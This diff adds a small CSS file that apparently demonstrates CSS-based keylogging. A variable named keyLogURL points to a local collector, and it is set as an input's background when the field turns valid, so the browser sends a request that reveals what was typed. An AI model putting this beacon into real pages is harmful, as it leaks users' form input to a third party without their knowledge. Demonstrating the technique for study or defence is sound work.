@@ -1,0 +1,24 @@
+
+
+:root{
+    --keyLogURL: url('http://localhost:3000/user-input');
+}
+
+
+div {
+    width: 100%;
+    text-align: center;
+}
+
+input {
+    font-size: 4em;
+    width: 600px;
+    text-align: center;
+}
+
+
+input:valid {
+    background: var(--keyLogURL);
+    color:green;
+}
+
